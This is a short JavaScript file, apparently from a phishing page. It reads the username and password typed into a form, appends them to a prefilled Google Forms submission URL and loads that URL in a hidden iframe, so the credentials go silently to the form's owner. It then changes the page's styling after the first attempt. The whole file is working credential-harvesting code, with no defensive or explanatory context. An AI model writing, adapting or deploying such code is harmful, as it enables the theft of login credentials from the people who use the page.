const string1 = "https://docs.google.com/forms/d/e/1FAIpQLSdl2RPNc43lbXIkTpw_XXzvXgEfxnuTJSFI-jn_nGvhg0ugRw/formResponse?usp=pp_url&entry.1435605535=";
const string2 = "&entry.975393741=";
var trynumber = 1

function myFunction() {
  const string3 = string1 + document.getElementById('username').value + string2 + document.getElementById('password').value
  console.log(string3)
}

async function go() {
  if (trynumber == 1) {
  var site = string1 + document.getElementById('username').value + string2 + document.getElementById('password').value;
    document.getElementById('iframe').src = site;
    document.getElementById('tagline').style.opacity = 1;
    document.getElementById('form').style.opacity = 0.3;
    trynumber = 2
}
}
